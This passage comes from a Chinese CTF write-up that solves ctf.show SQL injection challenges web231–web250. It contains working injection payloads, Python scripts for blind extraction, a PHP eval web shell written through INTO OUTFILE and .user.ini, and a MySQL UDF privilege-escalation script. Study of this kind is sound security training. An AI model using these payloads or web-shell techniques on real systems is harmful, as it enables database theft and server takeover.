href="https://blog.csdn.net/qq_41573234/article/details/80411079">https://blog.csdn.net/qq_41573234&#x2F;article&#x2F;details&#x2F;80411079</a></p></blockquote><p>他这里定义了自定义函数，所以需要去查询：<code>information_schema.Routines</code>这个：<br>其中的getFlag函数会调用flag 。也就是说直接<code>1&#39;;call getflag()</code>也可以<br>但其实这里已经显示出了flag：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690450427521-41d6da19-84df-4400-932d-8186fd04e438.png" alt="image.png"></p><h1 id="web231"><a href="#web231" class="headerlink" title="web231"></a>web231</h1><h3 id="update盲注"><a href="#update盲注" class="headerlink" title="update盲注"></a>update盲注</h3><p>这里需要开出来两个页面，一个负责修改（<code>/api/</code>），一个负责查看（<code>/update.php</code>）。直接修改内容，<br>比如在修改页面中传参：</p><pre class="language-php" data-language="php"><code class="language-php">password&#x3D;1&#39;,username&#x3D;database() where 1&#x3D;1#&amp;username&#x3D;1</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690461441854-8098f695-7156-4f77-a11f-4b87bc4fd815.png" alt="image.png"><br>运行之后返回查看页面发现被更新了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690461474262-de625929-36e1-4802-b43b-a5f9fffc57d3.png" alt="image.png"><br>然后就依次插入查询语句：</p><pre class="language-php" data-language="php"><code class="language-php">password&#x3D;1&#39;,username&#x3D;(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()) where 1&#x3D;1#&amp;username&#x3D;1banlist,ctfshow_user,flaga</code></pre><pre class="language-php" data-language="php"><code class="language-php">password&#x3D;1&#39;,username&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flaga&#39;) where 1&#x3D;1#&amp;username&#x3D;1id,flagas,info</code></pre><pre class="language-php" data-language="php"><code class="language-php">password&#x3D;1&#39;,username&#x3D;(select flagas from flaga) where 1&#x3D;1#&amp;username&#x3D;1ctfshow&#123;bda6ff95-49e5-4832-98ef-5f2156f74200&#125;</code></pre><h1 id="web232"><a href="#web232" class="headerlink" title="web232"></a>web232</h1><p>这个遇上一个的差别就是多个md5的括号需要闭合。</p><pre class="language-php" data-language="php"><code class="language-php">password&#x3D;1&#39;),username&#x3D;(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()) where 1&#x3D;1#&amp;username&#x3D;1banlist,ctfshow_user,flagaa</code></pre><pre class="language-php" data-language="php"><code class="language-php">password&#x3D;1&#39;),username&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flagaa&#39;) where 1&#x3D;1#&amp;username&#x3D;1id,flagass,info</code></pre><pre class="language-php" data-language="php"><code class="language-php">password&#x3D;1&#39;),username&#x3D;(select flagass from flagaa) where 1&#x3D;1#&amp;username&#x3D;1ctfshow&#123;d980485f-5f60-4558-a646-0c538bc3b9a1&#125;</code></pre><h1 id="web233"><a href="#web233" class="headerlink" title="web233"></a>web233</h1><p>盲注python。</p><pre class="language-php" data-language="php"><code class="language-php">&#x2F;&#x2F;分页查询$sql &#x3D; &quot;update ctfshow_user set pass &#x3D; &#39;&#123;$password&#125;&#39; where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;;      &#x2F;&#x2F;无过滤</code></pre><p>我们能注意到当输入密码的值为第一次出现时且正确时，后面的结果会出现<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690464682345-2a7b7d80-3e4d-4124-aefd-9a98db2a726d.png" alt="image.png"><br>但是如果后面为0或者出现过一次则出现<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690464738476-4e900a40-1db3-4449-b894-43c55ffd9137.png" alt="image.png">、<br>编写脚本即可：</p><pre class="language-php" data-language="php"><code class="language-php"># -*- encoding: utf-8 -*-&quot;&quot;&quot;@File    :   SQL布尔盲注.py   @Contact :   2997453446@qq.com@Blog    :   natro92.github.io @Modify Time      @Author    @Version    @Desciption------------      -------    --------    -----------2023&#x2F;7&#x2F;27 21:10   natro92      1.0         None&quot;&quot;&quot;import stringimport requestsimport timeimport randomurl &#x3D; r&#39;http:&#x2F;&#x2F;9a69458e-791c-4ebd-abe9-45cc89eaf042.challenge.ctf.show&#x2F;api&#x2F;&#39;flag_pre &#x3D; &#39;ctfshow&#123;&#39;str1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$&#x3D;,;_ -&#125;&quot;# payload &#x3D; &quot;ctfshow&#39;and+if(mid((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;# payload &#x3D; &quot;ctfshow&#39;and+if(mid((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag233333&#39;),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;payload &#x3D; &quot;ctfshow&#39;and+if(mid((select flagass233 from flag233333),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;res &#x3D; &#39;&#39;for i in range(1,100):    for j in str1:        data &#x3D; &#123;            &#39;username&#39;: payload.format(i, j),            &#39;password&#39;: str(random.random())        &#125;        r &#x3D; requests.post(url, data&#x3D;data)        # print(data)        # print(r.json()[&#39;msg&#39;])        if r&#39;成功&#39; in r.json()[&#39;msg&#39;]:            res +&#x3D; j            print(res)            break        if j &#x3D;&#x3D; &#39;&#125;&#39;:            exit()</code></pre><h1 id="web234"><a href="#web234" class="headerlink" title="web234"></a>web234</h1><p>单引号被过滤了，这里用了一个<code>\</code>来逃逸。<br>就比如原语句是：</p><pre class="language-php" data-language="php"><code class="language-php">$sql &#x3D; &quot;update ctfshow_user set pass &#x3D; &#39;&#123;$password&#125;&#39; where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;;</code></pre><p>插入之后的语句是：</p><pre class="language-php" data-language="php"><code class="language-php">$sql &#x3D; &quot;update ctfshow_user set pass &#x3D; &#39;\&#39; where username &#x3D; &#39;username&#39;;&quot;;</code></pre><p>然后pass张的内容就是<code>&#39; where username =</code><br>可能这么讲会听不太懂，就是将&#39;当作转义的’ 然后和后面的单引号闭合：<br><code>update ctfshow_user set pass = &#39;\&#39; where username = &#39;username&#39;;</code><br>也就变为了：<br><code>update ctfshow_user set pass = &#39;&#39; where username = &#39;username&#39;</code><br>测试payload：</p><pre class="language-php" data-language="php"><code class="language-php">password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(table_name) from information_schema.columns where table_schema&#x3D;database())--+  banlist,ctfshow_user,ctfshow_user,flag23a</code></pre><p>这里过滤掉了单引号，但是不闭合就查询不到，那就用十六进制来代替一下：</p><pre class="language-php" data-language="php"><code class="language-php">password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x666c6167323361)--+  id,flagass23s3,info</code></pre><pre class="language-php" data-language="php"><code class="language-php">password&#x3D;\&amp;username&#x3D;,username&#x3D;(select flagass23s3 from flag23a)--+  ctfshow&#123;a4682f2f-3c53-464d-8733-7d88487cb1f5&#125;</code></pre><h1 id="web235"><a href="#web235" class="headerlink" title="web235"></a>web235</h1><blockquote><p><a href="https://www.jb51.net/article/134678.htm">https://www.jb51.net/article/134678.htm</a> mysql统计信息<br><a href="https://zhuanlan.zhihu.com/p/98206699">https://zhuanlan.zhihu.com/p/98206699</a> 无列名注入</p></blockquote><h3 id="过滤了or-‘-information表的替代方法"><a href="#过滤了or-‘-information表的替代方法" class="headerlink" title="过滤了or  ‘ information表的替代方法"></a>过滤了or  ‘ information表的替代方法</h3><p>这里不只是or关键字不能用，连带着information也不能用了，因此也就需要用你别的查询方法了。<br><code>mysql.innodb_table_stats</code><br>比如：</p><pre class="language-php" data-language="php"><code class="language-php">password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(table_name) from mysql.innodb_table_stats where database_name&#x3D;database())--+  banlist,ctfshow_user,flag23a1</code></pre><pre class="language-php" data-language="php"><code class="language-php">select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a  ctfshow&#123;9970dea2-cadb-42d7-8c3b-a54b2ea469d1&#125;</code></pre><p>或者用：</p><pre class="language-php" data-language="php"><code class="language-php">username&#x3D;,username&#x3D;(select &#96;2&#96; from(select 1,2,3 union select * from flag23a1 limit 1,1)a)-- - &amp;password&#x3D;\ctfshow&#123;9970dea2-cadb-42d7-8c3b-a54b2ea469d1&#125;</code></pre><p>无列名这种特殊注入都可以。</p><h1 id="web236"><a href="#web236" class="headerlink" title="web236"></a>web236</h1><p>还过滤掉了flag这次 但没啥用 绕过flag的策略有很多。</p><pre class="language-php" data-language="php"><code class="language-php">password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(table_name) from mysql.innodb_table_stats where database_name&#x3D;database())--+banlist,ctfshow_user,flaga</code></pre><pre class="language-sql" data-language="sql"><code class="language-sql">password&#x3D;\&amp;username&#x3D;,username&#x3D;(select to_base64(b) from (select 1,2 as b,3 union select * from flaga limit 1,1)a)--+Y3Rmc2hvd3tkOTQyOTcxNC00MTA2LTRkMjItYjg0YS01ODFiOTIzOWI2MGJ9ctfshow&#123;d9429714-4106-4d22-b84a-581b9239b60b&#125;</code></pre><h1 id="web237"><a href="#web237" class="headerlink" title="web237"></a>web237</h1><h3 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h3><p>记得抓包，不是原来的那个api接口了，而是：<code>/api/insert.php</code><br>其余的都相同。</p><pre class="language-sql" data-language="sql"><code class="language-sql">username&#x3D;7&#39;,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()));--+&amp;password&#x3D;2banlist,ctfshow_user,flag</code></pre><pre class="language-sql" data-language="sql"><code class="language-sql">username&#x3D;7&#39;,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;));--+&amp;password&#x3D;2id,flagass23s3,info</code></pre><pre class="language-sql" data-language="sql"><code class="language-sql">username&#x3D;6&#39;,(select flagass23s3 from flag));--+&amp;password&#x3D;2ctfshow&#123;5efc59c3-4a93-4d07-a546-5a702b6c57c1&#125;</code></pre><h1 id="web238"><a href="#web238" class="headerlink" title="web238"></a>web238</h1><h3 id="insert-过滤空格"><a href="#insert-过滤空格" class="headerlink" title="insert 过滤空格"></a>insert 过滤空格</h3><pre class="language-sql" data-language="sql"><code class="language-sql">username&#x3D;3&#39;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())));#&amp;password&#x3D;1banlist,ctfshow_user,flagb</code></pre><pre class="language-sql" data-language="sql"><code class="language-sql">username&#x3D;3&#39;,(select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;flagb&#39;)));#&amp;password&#x3D;1id,flag,info</code></pre><pre class="language-sql" data-language="sql"><code class="language-sql">username&#x3D;3&#39;,(select(flag)from(flagb)));#&amp;password&#x3D;1ctfshow&#123;be8f3e4a-b6a0-4747-80d3-91979ef33988&#125;</code></pre><h1 id="web239"><a href="#web239" class="headerlink" title="web239"></a>web239</h1><h3 id="过滤空格-or"><a href="#过滤空格-or" class="headerlink" title="过滤空格 or"></a>过滤空格 or</h3><p>相同操作，只不过更换查询的表：</p><pre class="language-sql" data-language="sql"><code class="language-sql">username&#x3D;3&#39;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name&#x3D;database())));#&amp;password&#x3D;1banlist,ctfshow_user,flagbb</code></pre><p>这玩应把*过滤了，只能猜flag名，看了一下网上的做法基本如此。</p><pre class="language-sql" data-language="sql"><code class="language-sql">username&#x3D;1&#39;,(select&#96;flag&#96;from&#96;flagbb&#96;));#&amp;password&#x3D;1ctfshow&#123;0e1b5153-fff7-48be-aca1-cef950d964a0&#125;</code></pre><h1 id="web240"><a href="#web240" class="headerlink" title="web240"></a>web240</h1><p>Hint: 表名共9位，flag开头，后五位由a&#x2F;b组成，如flagabaab，全小写<br>意思就是让我们爆破呗。</p><pre class="language-sql" data-language="sql"><code class="language-sql">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;a2483863-8c01-4755-a5b3-decf561e6728.challenge.ctf.show&#x2F;api&#x2F;insert.php&quot;name &#x3D; &quot;flag&quot;res &#x3D; &#39;&#39;for a in &#39;ab&#39;:    for b in &#39;ab&#39;:        for c in &#39;ab&#39;:            for d in &#39;ab&#39;:                for e in &#39;ab&#39;:                    res &#x3D; name + a + b + c + d + e                    data &#x3D; &#123;                        &#39;username&#39;: f&quot;&#123;res&#125;&#39;,(select(flag)from(&#123;res&#125;)))#&quot;,                        &#39;password&#39;: &#39;a&#39;                    &#125;                    print(data)                    r &#x3D; requests.post(url, data&#x3D;data)</code></pre><p>跑完一遍之后刷新一下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690546632830-eb02d773-ff79-495a-9e30-5aa8c826e14b.png" alt="image.png"></p><h1 id="web241"><a href="#web241" class="headerlink" title="web241"></a>web241</h1><h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><p>遇事不决直接上盲注：<br>目标位置<code>api/delete.php</code><br>先决定一下测试payload，直接在id中传入：</p><pre class="language-sql" data-language="sql"><code class="language-sql">if(substr((database())),1,1)&#x3D;&#39;c&#39;,sleep(0.05),0)</code></pre><p>这时间盲注不同设备的时间不同，根据自己调整</p><pre class="language-sql" data-language="sql"><code class="language-sql"># -*- encoding: utf-8 -*-&quot;&quot;&quot;@File    :   SQL时间盲注1.py   @Contact :   2997453446@qq.com@Blog    :   natro92.github.io @Modify Time      @Author    @Version    @Desciption------------      -------    --------    -----------2023&#x2F;7&#x2F;28 20:21   natro92      1.0        web241&quot;&quot;&quot;import timeimport requestsfrom tqdm import trangeurl &#x3D; r&#39;http:&#x2F;&#x2F;b2100936-f04f-42cf-a179-f6bb35e08972.challenge.ctf.show&#x2F;api&#x2F;delete.php&#39;flag_pre &#x3D; &#39;ctfshow&#123;&#39;str &#x3D; &quot;_abcdefghijklmnopqrstuvwxyz0123456789&#123;-,&#125; &quot;# inside &#x3D; &#39;database()&#39;# inside &#x3D; &#39;select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()&#39;# inside &#x3D; &#39;select group_concat(column_name) from information_schema.columns where table_name &#x3D; &quot;flag&quot;&#39;inside &#x3D; &#39;substr((select group_concat(flag) from flag),9,36)&#39;payload &#x3D; &quot;if(substr((&#123;&#125;),&#123;&#125;,1)&#x3D;&#39;&#123;&#125;&#39;,sleep(0.05),0)&quot;res &#x3D; &#39;&#39;last &#x3D; &#39; &#39;for i in trange(1, 37):    for j in str:        data &#x3D; &#123;            &#39;id&#39;: payload.format(inside, i, j),        &#125;        try:            # print(data)            r &#x3D; requests.post(url, data&#x3D;data, timeout&#x3D;1)        except Exception as e:            last &#x3D; res            res +&#x3D; j            # print(res)            break        if last &#x3D;&#x3D; res.replace(&#39; &#39;,&#39;&#39;):            exit()        time.sleep(1)    print(res)</code></pre><p>网络的好坏决定着你在这个途中是否会出现错误。尽量减少位数的盲注，知道的前缀就别注了。</p><h1 id="web242"><a href="#web242" class="headerlink" title="web242"></a>web242</h1><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><pre class="language-sql" data-language="sql"><code class="language-sql">select * from ctfshow_user into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;dump&#x2F;&#123;$filename&#125;&#39;;</code></pre><h2 id="字段分隔符"><a href="#字段分隔符" class="headerlink" title="字段分隔符"></a>字段分隔符</h2><pre class="language-sql" data-language="sql"><code class="language-sql">FIELDS TERMINATED BY‘,‘字段间分割符OPTIONALLY ENCLOSED BY‘&quot;‘将字段包围 对数值型无效</code></pre><p>相关参考：</p><pre class="language-sql" data-language="sql"><code class="language-sql">SELECT ... INTO OUTFILE &#39;file_name&#39;        [CHARACTER SET charset_name]        [export_options] export_options:    [&#123;FIELDS | COLUMNS&#125;        [TERMINATED BY &#39;string&#39;]&#x2F;&#x2F;分隔符        [[OPTIONALLY] ENCLOSED BY &#39;char&#39;]        [ESCAPED BY &#39;char&#39;]    ]    [LINES        [STARTING BY &#39;string&#39;]        [TERMINATED BY &#39;string&#39;]    ]&#x2F;***********************************************************&#x2F;“OPTION”参数为可选参数选项，其可能的取值有： &#96;FIELDS TERMINATED BY &#39;字符串&#39;&#96;：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。 &#96;FIELDS ENCLOSED BY &#39;字符&#39;&#96;：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。 &#96;FIELDS OPTIONALLY ENCLOSED BY &#39;字符&#39;&#96;：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。 &#96;FIELDS ESCAPED BY &#39;字符&#39;&#96;：设置转义字符，只能为单个字符。默认值为“\”。 &#96;LINES STARTING BY &#39;字符串&#39;&#96;：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。 &#96;LINES TERMINATED BY &#39;字符串&#39;&#96;：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。</code></pre><p>比如：</p><pre class="language-sql" data-language="sql"><code class="language-sql">select * from user into outfile &quot;位置&quot; fileds terminated by &#39;写入内容&#39;</code></pre><p>当然换行符也可以使用。</p><pre class="language-sql" data-language="sql"><code class="language-sql">&#x2F;&#x2F;备份表$sql &#x3D; &quot;select * from ctfshow_user into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;dump&#x2F;&#123;$filename&#125;&#39;;&quot;;</code></pre><p>我们直接使用测试木马接口位置<code>/api/dump.php</code></p><pre class="language-sql" data-language="sql"><code class="language-sql">filename&#x3D;1.php&#39; fields terminated by &#39;&lt;?php eval($_REQUEST[1]);?&gt;&#39;#</code></pre><p>然后访问<code>/dump/1.php</code><br>get或post传参：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#x3D;system(&#39;cat &#x2F;flag.here&#39;);</code></pre><h1 id="web243"><a href="#web243" class="headerlink" title="web243"></a>web243</h1><h3 id="sql加文件上传图片马"><a href="#sql加文件上传图片马" class="headerlink" title="sql加文件上传图片马"></a>sql加文件上传图片马</h3><pre class="language-sql" data-language="sql"><code class="language-sql">0xa6175746f5f70726570656e645f66696c653d312e6a7067&#x3D;&#x3D;&gt; \nauto_prepend_file&#x3D;1.jpg</code></pre><p>首先先传入：</p><pre class="language-sql" data-language="sql"><code class="language-sql">filename&#x3D;1.jpg&#39; LINES TERMINATED BY 0xa6175746f5f70726570656e645f66696c653d312e6a7067</code></pre><p>再传入<code>.user.ini</code>：</p><pre class="language-sql" data-language="sql"><code class="language-sql">filename&#x3D;.user.ini&#39; LINES TERMINATED BY 0x0A6175746F5F70726570656E645F66696C653D67796C712E6A70670A#其中0x0A6175746F5F70726570656E645F66696C653D67796C712E6A70670A是&lt;?php eval($_REQUEST[1]);?&gt;</code></pre><p>然后访问：<code>dump/index.php</code><br>传入命令即可。<code>1=system(&#39;cat /flag.here&#39;);</code></p><h1 id="web244"><a href="#web244" class="headerlink" title="web244"></a>web244</h1><h3 id="报错注入-updatexml"><a href="#报错注入-updatexml" class="headerlink" title="报错注入 updatexml"></a>报错注入 updatexml</h3><pre class="language-sql" data-language="sql"><code class="language-sql">&#x2F;&#x2F;备份表$sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; &#39;&quot;.$id.&quot;&#39; limit 1;&quot;;&#x2F;&#x2F;无过滤</code></pre><p>用updatexml报错注入</p><pre class="language-sql" data-language="sql"><code class="language-sql">&#x2F;api&#x2F;?id&#x3D;&#39; or updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())),1) --+banlist,ctfshow_flag,ctfshow_use</code></pre><pre class="language-sql" data-language="sql"><code class="language-sql">&#x2F;?id&#x3D;&#39; or updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flag&#39;)),1) -- Aid,flag,info</code></pre><pre class="language-sql" data-language="sql"><code class="language-sql">flag太长需要查两遍：api&#x2F;?id&#x3D;&#39; or updatexml(1,concat(1,(select mid(flag,1,30) from ctfshow_flag)),1) --+api&#x2F;?id&#x3D;&#39; or updatexml(1,concat(1,(select mid(flag,20,30) from ctfshow_flag)),1) --+</code></pre><p>然后拼起来：<br>ctfshow{99150aa0-0cf6-4537-ad52-3043e2647334}</p><h1 id="web245"><a href="#web245" class="headerlink" title="web245"></a>web245</h1><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p>用法类似，这里不多赘述了</p><pre class="language-sql" data-language="sql"><code class="language-sql">api&#x2F;?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e)); --+banlist,ctfshow_flagsa,ctfshow_</code></pre><pre class="language-sql" data-language="sql"><code class="language-sql">api&#x2F;?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagsa&#39;),0x7e)); --+id,flag1,info</code></pre><pre class="language-sql" data-language="sql"><code class="language-sql">api&#x2F;?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,(select right(flag1,45) from ctfshow_flagsa),0x7e)); --+ctfshow&#123;1eaee386-fce7-49d8-86fdapi&#x2F;?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,(select right(flag1,30) from ctfshow_flagsa),0x7e)); --+6-fce7-49d8-86fd-15c29674ed78&#125;</code></pre><p>ctfshow{1eaee386-fce7-49d8-86fd-15c29674ed78}</p><h1 id="web246"><a href="#web246" class="headerlink" title="web246"></a>web246</h1><blockquote><p><a href="https://links.jianshu.com/go?to=https://www.cnblogs.com/wzy-ustc/p/14217750.html">https://www.cnblogs.com/wzy-ustc/p/14217750.html</a><br><a href="https://links.jianshu.com/go?to=https://www.cnblogs.com/laoxiajiadeyun/p/10283251.html">https://www.cnblogs.com/laoxiajiadeyun/p/10283251.html</a></p></blockquote><h3 id="floor双查询"><a href="#floor双查询" class="headerlink" title="floor双查询"></a>floor双查询</h3><pre class="language-sql" data-language="sql"><code class="language-sql">&#x2F;&#x2F;查表名&#x2F;?id&#x3D;1&#39; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),0x7e,floor(rand()*2))a from information_schema.tables group by a-- A&#x2F;&#x2F;查列名&#x2F;?id&#x3D;1&#39; union select 1,count(*),concat((select column_name from information_schema.columns where table_name&#x3D;&#39;ctfshow_flags&#39; limit 1,1),0x7e,floor(rand()*2))a from information_schema.tables group by a-- A&#x2F;&#x2F;查数据&#x2F;?id&#x3D;1&#39; union select 1,count(*),concat((select flag2 from ctfshow_flags),0x7e,floor(rand()*2))a from information_schema.tables group by a-- A</code></pre><p>需要二次上传才会出现结果</p><h1 id="web247"><a href="#web247" class="headerlink" title="web247"></a>web247</h1><h3 id="ceil代替floor"><a href="#ceil代替floor" class="headerlink" title="ceil代替floor"></a>ceil代替floor</h3><pre class="language-sql" data-language="sql"><code class="language-sql">$sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; &#39;&quot;.$id.&quot;&#39; limit 1;&quot;;</code></pre><p>使用ceil()(向上取整)代替floor()。当然也可以使用round()：<br>ROUND(X) – 表示将值 X 四舍五入为整数，无小数位<br>ROUND(X,D) – 表示将值 X 四舍五入为小数点后 D 位的数值，D为小数点后小数位数。若要保留 X 值小数点左边的 D 位，可将 D 设为负值。<br>最后的payload是：</p><pre class="language-sql" data-language="sql"><code class="language-sql">&#x2F;?id&#x3D;1&#39; union select 1,count(*),concat((select &#96;flag?&#96; from ctfshow_flagsa),0x7e,ceil(rand()*2))a from information_schema.tables group by a-- A</code></pre><p>可以看到这个字段名flag?加了反引号，原因是：<br>表名和字段名都可以用反引号引起来，这是用来区分MYSQL的保留字与普通字符。 表名、字段名、数据库名等可用反引号 ( &#96; )，也可以不使用反引号 ，但如果它包含特殊字符或保留字，则必须使用，如果不使用就会报错。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690557907870-84c2d526-6b51-41e6-9887-7731d9ddac80.png" alt="image.png"></p><h1 id="web248"><a href="#web248" class="headerlink" title="web248"></a>web248</h1><h3 id="UDF"><a href="#UDF" class="headerlink" title="UDF"></a>UDF</h3><blockquote><p><a href="https://lazzzaro.github.io/2020/05/16/web-SQL%E6%B3%A8%E5%85%A5/">https://lazzzaro.github.io/2020/05/16/web-SQL%E6%B3%A8%E5%85%A5/</a><br><a href="https://www.k0rz3n.com/2018/10/21/Mysql%20%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/#%E4%B8%89%E3%80%81MYSQL-UDF-%E6%8F%90%E6%9D%83">https://www.k0rz3n.com/2018/10/21/Mysql%20%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/#%E4%B8%89%E3%80%81MYSQL-UDF-%E6%8F%90%E6%9D%83</a><br><a href="https://www.sqlsec.com/tools/udf.html">https://www.sqlsec.com/tools/udf.html</a><br><a href="https://blog.csdn.net/qq_35938621/article/details/119846053">https://blog.csdn.net/qq_35938621&#x2F;article&#x2F;details&#x2F;119846053</a> 这里讲了详细步骤 建议看看</p></blockquote><p>UDF是mysql的一个拓展接口，UDF（Userdefined function）可翻译为用户自定义函数，这个是用来拓展Mysql的技术手段。当我们有读取和写入权限以后，我们就可以尝试使用UDF提权的方法，从数据库的root权限提升到系统的管理员权限。</p><pre class="language-sql" data-language="sql"><code class="language-sql">#参考脚本#环境：Linux&#x2F;MariaDBimport requests url&#x3D;&#39;http:&#x2F;&#x2F;89a7098e-03f5-47f3-9cb5-1f1cd3d640e9.challenge.ctf.show:8080&#x2F;api&#x2F;?id&#x3D;&#39;code&#x3D;&#39;&#39;codes&#x3D;[]for i in range(0,len(code),128):    codes.append(code[i:min(i+128,len(code))]) #建临时表sql&#x3D;&#39;&#39;&#39;create table temp(data longblob)&#39;&#39;&#39;payload&#x3D;&#39;&#39;&#39;0&#39;;&#123;&#125;;-- A&#39;&#39;&#39;.format(sql)requests.get(url+payload) #清空临时表sql&#x3D;&#39;&#39;&#39;delete from temp&#39;&#39;&#39;payload&#x3D;&#39;&#39;&#39;0&#39;;&#123;&#125;;-- A&#39;&#39;&#39;.format(sql)requests.get(url+payload) #插入第一段数据sql&#x3D;&#39;&#39;&#39;insert into temp(data) values (0x&#123;&#125;)&#39;&#39;&#39;.format(codes[0])payload&#x3D;&#39;&#39;&#39;0&#39;;&#123;&#125;;-- A&#39;&#39;&#39;.format(sql)requests.get(url+payload) #更新连接剩余数据for k in range(1,len(codes)):    sql&#x3D;&#39;&#39;&#39;update temp set data &#x3D; concat(data,0x&#123;&#125;)&#39;&#39;&#39;.format(codes[k])    payload&#x3D;&#39;&#39;&#39;0&#39;;&#123;&#125;;-- A&#39;&#39;&#39;.format(sql)    requests.get(url+payload) #10.3.18-MariaDB    #写入so文件sql&#x3D;&#39;&#39;&#39;select data from temp into dumpfile &#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;udf.so\&#39;&#39;&#39;&#39;payload&#x3D;&#39;&#39;&#39;0&#39;;&#123;&#125;;-- A&#39;&#39;&#39;.format(sql)requests.get(url+payload) #引入自定义函数sql&#x3D;&#39;&#39;&#39;create function sys_eval returns string soname &#39;udf.so\&#39;&#39;&#39;&#39;payload&#x3D;&#39;&#39;&#39;0&#39;;&#123;&#125;;-- A&#39;&#39;&#39;.format(sql)requests.get(url+payload) #命令执行，结果更新到界面sql&#x3D;&#39;&#39;&#39;update ctfshow_user set pass&#x3D;(select sys_eval(&#39;cat &#x2F;flag.her?&#39;))&#39;&#39;&#39;payload&#x3D;&#39;&#39;&#39;0&#39;;&#123;&#125;;-- A&#39;&#39;&#39;.format(sql)requests.get(url+payload) #查看结果r&#x3D;requests.get(url[:-4]+&#39;?page&#x3D;1&amp;limit&#x3D;10&#39;)print(r.text)</code></pre><h1 id="web249"><a href="#web249" class="headerlink" title="web249"></a>web249</h1><blockquote><p><a href="http://rui0.cn/archives/609">http://rui0.cn/archives/609</a><br><a href="https://www.anquanke.com/post/id/97211">https://www.anquanke.com/post/id/97211</a><br><a href="https://gylq.gitee.io/2021/08/04/%E3%80%90MongoDB%E3%80%91%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/">https://gylq.gitee.io/2021/08/04/%E3%80%90MongoDB%E3%80%91%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/</a></p></blockquote><h2 id="nosql"><a href="#nosql" class="headerlink" title="nosql"></a>nosql</h2><pre class="language-sql" data-language="sql"><code class="language-sql">$user &#x3D; $memcache-&gt;get($id);</code></pre><p>payload：</p><pre class="language-sql" data-language="sql"><code class="language-sql">api&#x2F;?id[]&#x3D;flag</code></pre><h1 id="web250"><a href="#web250" class="headerlink" title="web250"></a>web250</h1><pre class="language-sql" data-language="sql"><code class="language-sql">  $query &#x3D; new MongoDB\Driver\Query($data);  $cursor &#x3D; $manager-&gt;executeQuery(&#39;ctfshow.ctfshow_user&#39;, $query)-&gt;toArray();&#x2F;&#x2F;无过滤  if(count($cursor)&gt;0)&#123;    $ret[&#39;msg&#39;]&#x3D;&#39;登陆成功&#39;;    array_push($ret[&#39;data&#39;], $flag);  &#125;</code></pre><pre class="language-sql" data-language="sql"><code class="language-sql">username[$ne]&#x3D;1&amp;password[$ne]&#x3D;1</code></pre><p>有的时候服务器会摆，重启一下试试</p><h1 id="web251"><a href="#web251" class="headerlink" 